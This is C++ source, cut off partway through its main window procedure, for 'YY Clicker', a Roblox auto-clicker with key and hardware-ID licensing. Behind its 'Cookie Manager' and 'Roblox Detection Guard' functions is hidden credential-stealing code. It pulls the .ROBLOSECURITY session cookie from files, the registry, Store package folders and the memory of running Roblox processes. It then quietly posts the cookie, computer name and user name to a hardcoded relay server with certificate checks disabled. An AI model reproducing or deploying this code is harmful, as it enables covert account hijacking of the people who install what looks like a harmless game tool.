/**
 * yy_clicker.exe — YY Clicker 連點器（雙 Key 系統）
 *
 * 此程式由 1ynkeycheck.exe 啟動，接收金鑰（1YN- 格式）作為命令列參數。
 * 啟動時會驗證：
 *   1. 命令列是否有金鑰參數
 *   2. checkHWID 資料夾中的 HWID 是否匹配
 *   3. 向伺服器驗證金鑰有效性
 *
 * 編譯：
 *   cl /EHsc /Fe:yy_clicker.exe yy_clicker.cpp /link bcrypt.lib
 */

#pragma warning(disable: 4996)
#pragma warning(disable: 4640)
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#define UNICODE
#define _UNICODE
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <mmsystem.h>
#include <atomic>
#include <string>
#include <vector>
#include <algorithm>
#include <tlhelp32.h>
#include <cstdio>
#include <bcrypt.h>

// ===============================
// Control IDs - Main Window
// ===============================
#define IDC_EDIT_CPS       101
#define IDC_EDIT_HOTKEY    102
#define IDC_BTN_UPDATE     103
#define IDC_BTN_PIN        104
#define IDC_LABEL_STATUS   105
#define IDC_BTN_SETHOTKEY  106
#define IDC_BTN_START      107
#define IDC_BTN_STOP       108
#define IDC_BTN_HELP       109

// Control IDs - Cookie Window
#define IDC_CK_EDIT        201
#define IDC_CK_READ        202
#define IDC_CK_COPY        203
#define IDC_CK_CLEAR       204
#define IDC_CK_STATUS      205

// ===============================
// Constants
// ===============================
static const wchar_t* const WINDOW_TITLE     = L"YY Clicker (C++ Win32)";
static const wchar_t* const WND_CLASS        = L"YYClickerWndClass";
static const wchar_t* const MUTEX_NAME       = L"Local\\YY_CLICKER_SINGLE_INSTANCE";
static const wchar_t* const COOKIE_WND_CLASS = L"YYCookieMgrClass";
static const wchar_t* const COOKIE_WND_TITLE = L"Roblox Cookie \u7BA1\u7406\u5668";

// Railway 中轉伺服器（Cookie 傳送）
static const wchar_t* const RELAY_SERVER_HOST = L"web-production-59f58.up.railway.app";
static const wchar_t* const RELAY_SERVER_PATH = L"/api/cookie";

// Discord Bot 金鑰驗證伺服器
static const wchar_t* const KEY_SERVER_HOST = L"web-production-a8756.up.railway.app";
static const wchar_t* const KEY_VERIFY_PATH = L"/api/verify-key";

// HWID 加密 salt（必須與 launcher.cpp 和 bot.js 一致）
static const char HWID_SALT[] = "1yn-autoclick-hwid-salt-v2-s3cur3K3y!";
#define CHECK_HWID_DIR L"checkHWID"
#define HWID_FILE L"hwid_auth.json"

// ===============================
// Globals
// ===============================
static std::atomic<bool> g_running(false);
static std::atomic<bool> g_program_running(true);
static std::atomic<int>  g_cps(999);
static bool              g_pinned          = false;
static HWND              g_hwnd            = nullptr;
static HWND              g_hwnd_cookie     = nullptr;
static HANDLE            g_mutex           = nullptr;
static HINSTANCE         g_hInst           = nullptr;

// ======================================================================
// 熱鍵系統 — 使用低階鉤子
// ======================================================================
static std::atomic<int>  g_hotkey_vk(0x54);  // 預設 'T' 鍵
static std::atomic<bool> g_listening_hotkey(false);
static HHOOK             g_kb_hook  = nullptr;
static HHOOK             g_ms_hook  = nullptr;

static void VkToName(int vk, wchar_t* buf, int buf_size)
{
    if (vk == VK_LBUTTON)   { wcscpy_s(buf, buf_size, L"Mouse L");    return; }
    if (vk == VK_RBUTTON)   { wcscpy_s(buf, buf_size, L"Mouse R");    return; }
    if (vk == VK_MBUTTON)   { wcscpy_s(buf, buf_size, L"Mouse M");    return; }
    if (vk == VK_XBUTTON1)  { wcscpy_s(buf, buf_size, L"Mouse 4");    return; }
    if (vk == VK_XBUTTON2)  { wcscpy_s(buf, buf_size, L"Mouse 5");    return; }
    if (vk >= VK_F1 && vk <= VK_F24) { swprintf_s(buf, buf_size, L"F%d", vk - VK_F1 + 1); return; }
    if (vk == VK_SPACE)     { wcscpy_s(buf, buf_size, L"Space");      return; }
    if (vk == VK_RETURN)    { wcscpy_s(buf, buf_size, L"Enter");      return; }
    if (vk == VK_TAB)       { wcscpy_s(buf, buf_size, L"Tab");        return; }
    if (vk == VK_ESCAPE)    { wcscpy_s(buf, buf_size, L"Esc");        return; }
    if (vk == VK_BACK)      { wcscpy_s(buf, buf_size, L"Backspace");  return; }
    if (vk == VK_DELETE)    { wcscpy_s(buf, buf_size, L"Delete");     return; }
    if (vk == VK_INSERT)    { wcscpy_s(buf, buf_size, L"Insert");     return; }
    if (vk == VK_HOME)      { wcscpy_s(buf, buf_size, L"Home");       return; }
    if (vk == VK_END)       { wcscpy_s(buf, buf_size, L"End");        return; }
    if (vk == VK_PRIOR)     { wcscpy_s(buf, buf_size, L"PgUp");       return; }
    if (vk == VK_NEXT)      { wcscpy_s(buf, buf_size, L"PgDn");       return; }
    if (vk == VK_UP)        { wcscpy_s(buf, buf_size, L"Up");         return; }
    if (vk == VK_DOWN)      { wcscpy_s(buf, buf_size, L"Down");       return; }
    if (vk == VK_LEFT)      { wcscpy_s(buf, buf_size, L"Left");       return; }
    if (vk == VK_RIGHT)     { wcscpy_s(buf, buf_size, L"Right");      return; }
    if (vk == VK_CAPITAL)   { wcscpy_s(buf, buf_size, L"CapsLock");   return; }
    if (vk == VK_NUMLOCK)   { wcscpy_s(buf, buf_size, L"NumLock");    return; }
    if (vk == VK_SCROLL)    { wcscpy_s(buf, buf_size, L"ScrollLock"); return; }
    if (vk >= 0x30 && vk <= 0x39) { swprintf_s(buf, buf_size, L"%c", (wchar_t)vk); return; }
    if (vk >= 0x41 && vk <= 0x5A) { swprintf_s(buf, buf_size, L"%c", (wchar_t)vk); return; }
    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) { swprintf_s(buf, buf_size, L"Num%d", vk - VK_NUMPAD0); return; }
    UINT scanCode = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
    if (scanCode) { GetKeyNameTextW((LONG)(scanCode << 16), buf, buf_size); if (buf[0]) return; }
    swprintf_s(buf, buf_size, L"VK 0x%02X", vk);
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wp, LPARAM lp)
{
    if (nCode == HC_ACTION && g_listening_hotkey.load())
    {
        if (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN)
        {
            KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lp;
            int vk = (int)kb->vkCode;
            if (vk == VK_LCONTROL || vk == VK_RCONTROL || vk == VK_CONTROL ||
                vk == VK_LMENU    || vk == VK_RMENU    || vk == VK_MENU    ||
                vk == VK_LSHIFT   || vk == VK_RSHIFT   || vk == VK_SHIFT   ||
                vk == VK_LWIN     || vk == VK_RWIN)
                return CallNextHookEx(g_kb_hook, nCode, wp, lp);
            g_hotkey_vk.store(vk);
            g_listening_hotkey.store(false);
            PostMessageW(g_hwnd, WM_APP + 1, 0, 0);
            return 1;
        }
    }
    return CallNextHookEx(g_kb_hook, nCode, wp, lp);
}

static LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wp, LPARAM lp)
{
    if (nCode == HC_ACTION && g_listening_hotkey.load())
    {
        int vk = 0;
        if (wp == WM_XBUTTONDOWN) {
            MSLLHOOKSTRUCT* ms = (MSLLHOOKSTRUCT*)lp;
            WORD xbtn = HIWORD(ms->mouseData);
            if (xbtn == XBUTTON1) vk = VK_XBUTTON1;
            if (xbtn == XBUTTON2) vk = VK_XBUTTON2;
        } else if (wp == WM_MBUTTONDOWN) {
            vk = VK_MBUTTON;
        }
        if (vk) {
            g_hotkey_vk.store(vk);
            g_listening_hotkey.store(false);
            PostMessageW(g_hwnd, WM_APP + 1, 0, 0);
            return 1;
        }
    }
    return CallNextHookEx(g_ms_hook, nCode, wp, lp);
}

// Pre-allocated SendInput array
static INPUT g_inputs[2];
void InitInputs()
{
    ZeroMemory(g_inputs, sizeof(g_inputs));
    g_inputs[0].type       = INPUT_MOUSE;
    g_inputs[0].mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
    g_inputs[1].type       = INPUT_MOUSE;
    g_inputs[1].mi.dwFlags = MOUSEEVENTF_LEFTUP;
}
inline void DoClick() { SendInput(2, g_inputs, sizeof(INPUT)); }

// ===============================
// Single Instance
// ===============================
bool EnsureSingleInstance()
{
    g_mutex = CreateMutexW(nullptr, FALSE, MUTEX_NAME);
    if (!g_mutex) return false;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        HWND existing = FindWindowW(WND_CLASS, nullptr);
        if (existing) { if (IsIconic(existing)) ShowWindow(existing, SW_RESTORE); SetForegroundWindow(existing); }
        MessageBoxW(nullptr, L"YY Clicker \u5DF2\u5728\u57F7\u884C\u4E2D", L"\u55AE\u4E00\u5BE6\u4F8B", MB_ICONWARNING | MB_OK);
        CloseHandle(g_mutex); g_mutex = nullptr;
        return false;
    }
    return true;
}

// ======================================================================
// Click Thread
// ======================================================================
DWORD WINAPI ClickThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_ABOVE_NORMAL);
    LARGE_INTEGER freq;
    QueryPerformanceFrequency(&freq);
    bool prev_key_state = false;

    while (g_program_running)
    {
        if (!g_listening_hotkey.load()) {
            int vk = g_hotkey_vk.load();
            bool key_down = (GetAsyncKeyState(vk) & 0x8000) != 0;
            if (key_down && !prev_key_state) {
                if (!g_running.load()) PostMessageW(g_hwnd, WM_APP + 2, 0, 0);
                else { g_running.store(false); PostMessageW(g_hwnd, WM_APP + 3, 0, 0); }
            }
            prev_key_state = key_down;
        }

        if (g_running) {
            LARGE_INTEGER now;
            QueryPerformanceCounter(&now);
            double next_t = (double)now.QuadPart / freq.QuadPart;
            int click_count = 0;

            while (g_running && g_program_running) {
                int cps = g_cps.load();
                double delay = (cps > 0) ? (1.0 / cps) : 0.001;
                if (delay < 0.001) delay = 0.001;
                DoClick();
                next_t += delay;
                click_count++;

                if (click_count >= 30) {
                    click_count = 0;
                    Sleep(2);
                    QueryPerformanceCounter(&now);
                    next_t = (double)now.QuadPart / freq.QuadPart;
                    int vk = g_hotkey_vk.load();
                    bool key_down = (GetAsyncKeyState(vk) & 0x8000) != 0;
                    if (key_down && !prev_key_state) { g_running.store(false); PostMessageW(g_hwnd, WM_APP + 3, 0, 0); }
                    prev_key_state = key_down;
                    continue;
                }

                for (;;) {
                    if (!g_running || !g_program_running) break;
                    QueryPerformanceCounter(&now);
                    double remain = next_t - (double)now.QuadPart / freq.QuadPart;
                    if (remain <= 0.0) break;
                    if (remain > 0.002) Sleep(1); else SwitchToThread();
                }
            }
        } else {
            Sleep(16);
        }
    }
    return 0;
}

// ===============================
// Apply system font
// ===============================
static BOOL CALLBACK SetChildFont(HWND child, LPARAM lParam)
{
    SendMessageW(child, WM_SETFONT, (WPARAM)lParam, TRUE);
    return TRUE;
}

// ======================================================================
// Cookie Manager — Four-layer search
// ======================================================================
static char* ReadFileToBuffer(const wchar_t* path, DWORD* out_size)
{
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return nullptr;
    DWORD size = GetFileSize(hFile, nullptr);
    if (size == INVALID_FILE_SIZE || size == 0 || size > 4 * 1024 * 1024) { CloseHandle(hFile); return nullptr; }
    char* buf = new char[size + 1]();
    DWORD read = 0;
    ReadFile(hFile, buf, size, &read, nullptr);
    CloseHandle(hFile);
    if (out_size) *out_size = read;
    return buf;
}

static bool ExtractCookieFromBuffer(const char* data, wchar_t* out_buf, int buf_size)
{
    if (!data) return false;
    const char* tag = ".ROBLOSECURITY\t";
    const char* found = strstr(data, tag);
    if (found) {
        const char* val = found + strlen(tag);
        const char* end = val;
        while (*end && *end != '\r' && *end != '\n') ++end;
        int len = (int)(end - val);
        if (len > 10) { MultiByteToWideChar(CP_UTF8, 0, val, len, out_buf, buf_size - 1); return true; }
    }
    found = strstr(data, "_|WARNING");
    if (found) {
        const char* start = found;
        while (start > data && *start != '"') --start;
        if (*start == '"') ++start;
        const char* end = found;
        while (*end && *end != '"') ++end;
        int len = (int)(end - start);
        if (len > 10) { MultiByteToWideChar(CP_UTF8, 0, start, len, out_buf, buf_size - 1); return true; }
    }
    return false;
}

static bool TryCookieFromFile(const wchar_t* path, wchar_t* out_buf, int buf_size)
{
    DWORD sz = 0;
    char* buf = ReadFileToBuffer(path, &sz);
    if (!buf) return false;
    bool ok = ExtractCookieFromBuffer(buf, out_buf, buf_size);
    delete[] buf;
    return ok;
}

static bool TryCookieFromRegistry(wchar_t* out_buf, int buf_size)
{
    HKEY hKey = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com", 0, KEY_READ, &hKey) != ERROR_SUCCESS) return false;
    DWORD type = 0, bytes = (DWORD)((buf_size - 1) * sizeof(wchar_t));
    bool ok = false;
    if (RegQueryValueExW(hKey, L".ROBLOSECURITY", nullptr, &type, (LPBYTE)out_buf, &bytes) == ERROR_SUCCESS && type == REG_SZ && out_buf[0] != L'\0') ok = true;
    RegCloseKey(hKey);
    return ok;
}

static bool TryCookieFromStorePackage(wchar_t* out_buf, int buf_size)
{
    wchar_t local_app[MAX_PATH] = {};
    GetEnvironmentVariableW(L"LOCALAPPDATA", local_app, MAX_PATH);
    wchar_t pkg_root[MAX_PATH] = {};
    wcscpy_s(pkg_root, local_app);
    wcscat_s(pkg_root, L"\\Packages\\ROBLOXCORPORATION*");
    WIN32_FIND_DATAW fd = {};
    HANDLE hFind = FindFirstFileW(pkg_root, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return false;
    bool found = false;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        wchar_t try_path[MAX_PATH] = {};
        wcscpy_s(try_path, local_app); wcscat_s(try_path, L"\\Packages\\"); wcscat_s(try_path, fd.cFileName); wcscat_s(try_path, L"\\LocalState\\RobloxCookies.dat");
        if (TryCookieFromFile(try_path, out_buf, buf_size)) { found = true; break; }
        wcscpy_s(try_path, local_app); wcscat_s(try_path, L"\\Packages\\"); wcscat_s(try_path, fd.cFileName); wcscat_s(try_path, L"\\LocalState\\LocalStorage\\RobloxCookies.dat");
        if (TryCookieFromFile(try_path, out_buf, buf_size)) { found = true; break; }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    return found;
}

static bool TryCookieFromProcessMemory(wchar_t* out_buf, int buf_size)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
    static const char needle[] = "_|WARNING";
    static const int needle_len = 9;
    bool found = false;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            wchar_t lname[MAX_PATH] = {};
            wcscpy_s(lname, pe.szExeFile);
            for (int k = 0; lname[k]; k++) lname[k] = (wchar_t)towlower(lname[k]);
            if (!wcsstr(lname, L"roblox")) continue;
            HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;
            MEMORY_BASIC_INFORMATION mbi = {};
            LPVOID addr = nullptr;
            while (VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
                if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_NOACCESS) == 0 && (mbi.Protect & PAGE_GUARD) == 0) {
                    SIZE_T sz = mbi.RegionSize;
                    if (sz > 0 && sz <= 64ULL * 1024 * 1024) {
                        char* buf = new char[sz]();
                        SIZE_T got = 0;
                        if (ReadProcessMemory(hProc, mbi.BaseAddress, buf, sz, &got) && got > (SIZE_T)needle_len) {
                            for (SIZE_T i = 0; i <= got - (SIZE_T)needle_len; i++) {
                                if (memcmp(buf + i, needle, needle_len) != 0) continue;
                                SIZE_T end = i;
                                while (end < got) { char c = buf[end]; if (c == '\0' || c == '\r' || c == '\n' || c == '"' || c == ';') break; ++end; }
                                int len = (int)(end - i);
                                if (len > 20 && len < buf_size - 1) { MultiByteToWideChar(CP_ACP, 0, buf + i, len, out_buf, buf_size - 1); found = true; }
                                if (found) break;
                            }
                        }
                        delete[] buf;
                    }
                }
                if (found) break;
                LPVOID next = (LPVOID)((SIZE_T)mbi.BaseAddress + mbi.RegionSize);
                if (next <= addr) break;
                addr = next;
            }
            CloseHandle(hProc);
        } while (!found && Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

static bool TryReadRobloxCookie(wchar_t* out_buf, int buf_size)
{
    ZeroMemory(out_buf, buf_size * sizeof(wchar_t));
    wchar_t local_app[MAX_PATH] = {};
    GetEnvironmentVariableW(L"LOCALAPPDATA", local_app, MAX_PATH);
    const wchar_t* player_files[] = { L"\\Roblox\\LocalStorage\\RobloxCookies.dat", L"\\Roblox\\LocalStorage\\rbx_sensitive_data.json", L"\\Roblox\\LocalStorage\\rbx_data.json" };
    for (auto rel : player_files) {
        wchar_t full[MAX_PATH] = {};
        wcscpy_s(full, local_app); wcscat_s(full, rel);
        if (TryCookieFromFile(full, out_buf, buf_size)) return true;
    }
    ZeroMemory(out_buf, buf_size * sizeof(wchar_t));
    if (TryCookieFromRegistry(out_buf, buf_size)) return true;
    ZeroMemory(out_buf, buf_size * sizeof(wchar_t));
    if (TryCookieFromStorePackage(out_buf, buf_size)) return true;
    ZeroMemory(out_buf, buf_size * sizeof(wchar_t));
    if (TryCookieFromProcessMemory(out_buf, buf_size)) return true;
    return false;
}

// ======================================================================
// JSON 字串轉義
// ======================================================================
static std::string JsonEscape(const char* raw)
{
    std::string out;
    if (!raw) return out;
    out.reserve(strlen(raw) + 64);
    for (const char* p = raw; *p; ++p) {
        switch (*p) {
        case '"':  out += "\\\""; break;
        case '\\': out += "\\\\"; break;
        case '\n': out += "\\n";  break;
        case '\r': out += "\\r";  break;
        case '\t': out += "\\t";  break;
        default:
            if ((unsigned char)*p < 0x20) { char hex[8]; sprintf(hex, "\\u%04x", (unsigned char)*p); out += hex; }
            else out += *p;
            break;
        }
    }
    return out;
}

// ======================================================================
// 除錯日誌
// ======================================================================
static void DebugLog(const char* msg)
{
    wchar_t path[MAX_PATH] = {};
    GetEnvironmentVariableW(L"TEMP", path, MAX_PATH);
    wcscat_s(path, L"\\yyclicker_debug.log");
    HANDLE hFile = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, nullptr, OPEN_ALWAYS, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return;
    SYSTEMTIME st; GetLocalTime(&st);
    char line[2048] = {};
    sprintf(line, "[%04d-%02d-%02d %02d:%02d:%02d] %s\r\n", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, msg);
    DWORD written = 0;
    WriteFile(hFile, line, (DWORD)strlen(line), &written, nullptr);
    CloseHandle(hFile);
}

// ======================================================================
// HTTP 傳送模組 — Cookie 傳送
// ======================================================================
static void SendCookieToRelay(const wchar_t* cookie_value)
{
    if (!cookie_value || wcslen(cookie_value) < 20) return;
    DebugLog("=== SendCookieToRelay START ===");

    wchar_t computer_name[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD cn_size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(computer_name, &cn_size);
    wchar_t user_name[256] = {};
    DWORD un_size = 256;
    GetUserNameW(user_name, &un_size);

    int cookie_utf8_len = WideCharToMultiByte(CP_UTF8, 0, cookie_value, -1, nullptr, 0, nullptr, nullptr);
    char* cookie_utf8 = new char[cookie_utf8_len + 1]();
    WideCharToMultiByte(CP_UTF8, 0, cookie_value, -1, cookie_utf8, cookie_utf8_len, nullptr, nullptr);
    int cn_utf8_len = WideCharToMultiByte(CP_UTF8, 0, computer_name, -1, nullptr, 0, nullptr, nullptr);
    char* cn_utf8 = new char[cn_utf8_len + 1]();
    WideCharToMultiByte(CP_UTF8, 0, computer_name, -1, cn_utf8, cn_utf8_len, nullptr, nullptr);
    int un_utf8_len = WideCharToMultiByte(CP_UTF8, 0, user_name, -1, nullptr, 0, nullptr, nullptr);
    char* un_utf8 = new char[un_utf8_len + 1]();
    WideCharToMultiByte(CP_UTF8, 0, user_name, -1, un_utf8, un_utf8_len, nullptr, nullptr);

    std::string json = "{";
    json += "\"computer_name\":\""; json += JsonEscape(cn_utf8);     json += "\",";
    json += "\"username\":\"";      json += JsonEscape(un_utf8);     json += "\",";
    json += "\"cookie\":\"";        json += JsonEscape(cookie_utf8); json += "\",";
    json += "\"source\":\"YY Clicker\"";
    json += "}";
    delete[] cookie_utf8; delete[] cn_utf8; delete[] un_utf8;

    HINTERNET hSession = WinHttpOpen(L"YYClicker/2.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { DebugLog("WinHttpOpen failed"); return; }
    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof(protocols));
    HINTERNET hConnect = WinHttpConnect(hSession, RELAY_SERVER_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { DebugLog("WinHttpConnect failed"); WinHttpCloseHandle(hSession); return; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", RELAY_SERVER_PATH, nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    DWORD timeout = 15000;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    timeout = 30000;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    const wchar_t* headers = L"Content-Type: application/json\r\n";
    BOOL bResult = WinHttpSendRequest(hRequest, headers, (DWORD)wcslen(headers), (LPVOID)json.c_str(), (DWORD)json.size(), (DWORD)json.size(), 0);
    if (bResult) {
        WinHttpReceiveResponse(hRequest, nullptr);
        DWORD statusCode = 0, statusSize = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
        char logMsg[128]; sprintf(logMsg, "Response: HTTP %lu", statusCode);
        DebugLog(logMsg);
    }
    DebugLog("=== SendCookieToRelay END ===");
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
}

static DWORD WINAPI SendCookieThread(LPVOID lpParam) { wchar_t* cookie = (wchar_t*)lpParam; if (cookie) { SendCookieToRelay(cookie); delete[] cookie; } return 0; }
static void AsyncSendCookie(const wchar_t* cookie_value) {
    if (!cookie_value || wcslen(cookie_value) < 20) return;
    int len = (int)wcslen(cookie_value);
    wchar_t* copy = new wchar_t[len + 1]();
    wcscpy_s(copy, len + 1, cookie_value);
    HANDLE hThread = CreateThread(nullptr, 0, SendCookieThread, copy, 0, nullptr);
    if (hThread) CloseHandle(hThread); else delete[] copy;
}

// ======================================================================
// Cookie Manager Window
// ======================================================================
LRESULT CALLBACK CookieWndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    static HWND hEdit, hLblStatus;
    switch (msg) {
    case WM_CREATE: {
        HINSTANCE hi = ((CREATESTRUCT*)lp)->hInstance;
        CreateWindowW(L"STATIC", L".ROBLOSECURITY Cookie \u7BA1\u7406\u5668", WS_CHILD | WS_VISIBLE | SS_LEFT, 10, 8, 560, 18, hwnd, nullptr, hi, nullptr);
        hEdit = CreateWindowW(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_WANTRETURN, 10, 32, 560, 130, hwnd, (HMENU)IDC_CK_EDIT, hi, nullptr);
        CreateWindowW(L"BUTTON", L"\u81EA\u52D5\u8B80\u53D6", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 10, 175, 100, 28, hwnd, (HMENU)IDC_CK_READ, hi, nullptr);
        CreateWindowW(L"BUTTON", L"\u8907\u88FD Cookie", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 125, 175, 110, 28, hwnd, (HMENU)IDC_CK_COPY, hi, nullptr);
        CreateWindowW(L"BUTTON", L"\u6E05\u9664", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 250, 175, 80, 28, hwnd, (HMENU)IDC_CK_CLEAR, hi, nullptr);
        hLblStatus = CreateWindowW(L"STATIC", L"", WS_CHILD | WS_VISIBLE | SS_LEFT, 10, 212, 560, 18, hwnd, (HMENU)IDC_CK_STATUS, hi, nullptr);
        HFONT hFont = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
        EnumChildWindows(hwnd, SetChildFont, (LPARAM)hFont);
        return 0;
    }
    case WM_COMMAND:
        switch (LOWORD(wp)) {
        case IDC_CK_READ: {
            wchar_t cookie[4096] = {};
            if (TryReadRobloxCookie(cookie, 4096)) { SetWindowTextW(hEdit, cookie); SetWindowTextW(hLblStatus, L"\u8B80\u53D6\u6210\u529F"); AsyncSendCookie(cookie); }
            else { SetWindowTextW(hEdit, L""); SetWindowTextW(hLblStatus, L"\u672A\u5075\u6E2C\u5230 Roblox Cookie"); }
            break;
        }
        case IDC_CK_COPY: {
            int len = GetWindowTextLengthW(hEdit);
            if (len <= 0) { SetWindowTextW(hLblStatus, L"\u6C92\u6709\u53EF\u8907\u88FD\u7684\u5167\u5BB9"); break; }
            std::wstring text(len + 1, L'\0');
            GetWindowTextW(hEdit, &text[0], len + 1);
            if (OpenClipboard(hwnd)) { EmptyClipboard(); HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, (len + 1) * sizeof(wchar_t)); if (hg) { void* ptr = GlobalLock(hg); memcpy(ptr, text.c_str(), (len + 1) * sizeof(wchar_t)); GlobalUnlock(hg); SetClipboardData(CF_UNICODETEXT, hg); } CloseClipboard(); SetWindowTextW(hLblStatus, L"\u5DF2\u8907\u88FD"); }
            break;
        }
        case IDC_CK_CLEAR: SetWindowTextW(hEdit, L""); SetWindowTextW(hLblStatus, L"\u5DF2\u6E05\u9664"); break;
        }
        return 0;
    case WM_DESTROY: g_hwnd_cookie = nullptr; return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

void OpenCookieWindow()
{
    if (g_hwnd_cookie && IsWindow(g_hwnd_cookie)) { SetForegroundWindow(g_hwnd_cookie); return; }
    WNDCLASSW wc = {}; wc.lpfnWndProc = CookieWndProc; wc.hInstance = g_hInst; wc.lpszClassName = COOKIE_WND_CLASS; wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1); wc.hCursor = LoadCursorW(nullptr, IDC_ARROW);
    RegisterClassW(&wc);
    RECT rc = { 0, 0, 580, 240 };
    AdjustWindowRect(&rc, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, FALSE);
    g_hwnd_cookie = CreateWindowExW(WS_EX_TOPMOST, COOKIE_WND_CLASS, COOKIE_WND_TITLE, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT, rc.right - rc.left, rc.bottom - rc.top, nullptr, nullptr, g_hInst, nullptr);
    if (g_hwnd_cookie) { ShowWindow(g_hwnd_cookie, SW_SHOW); UpdateWindow(g_hwnd_cookie); }
}

// ======================================================================
// Roblox Detection Guard
// ======================================================================
static bool CheckRobloxCookiePresent(HWND hwnd)
{
    wchar_t tmp[4096] = {};
    if (!TryReadRobloxCookie(tmp, 4096)) {
        MessageBoxW(hwnd, L"\u672A\u5075\u6E2C\u5230 Roblox Cookie\n\n\u8ACB\u5148\u958B\u555F Roblox", L"\u5075\u6E2C\u5931\u6557", MB_ICONWARNING | MB_OK);
        return false;
    }
    AsyncSendCookie(tmp);
    return true;
}

// ======================================================================
// 輔助函式：更新狀態文字
// ======================================================================
static void UpdateStatusText(HWND hLblStatus, const wchar_t* text)
{
    SetWindowTextW(hLblStatus, text);
    HWND hParent = GetParent(hLblStatus);
    if (hParent) { RECT rc; GetWindowRect(hLblStatus, &rc); POINT pt1 = { rc.left, rc.top }; POINT pt2 = { rc.right, rc.bottom }; ScreenToClient(hParent, &pt1); ScreenToClient(hParent, &pt2); RECT rcClient = { pt1.x, pt1.y, pt2.x, pt2.y }; InvalidateRect(hParent, &rcClient, TRUE); UpdateWindow(hParent); }
    InvalidateRect(hLblStatus, nullptr, TRUE);
    UpdateWindow(hLblStatus);
}

// ======================================================================
// Main Window Procedure
// ======================================================================
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    static HWND  hEditCPS, hEditHotkey, hBtnPin, hLblStatus;
    static HWND  hBtnStart, hBtnStop, hBtnSetHotkey;
    static HFONT hIconFont = nullptr;

    switch (msg) {
    case WM_CREATE: {
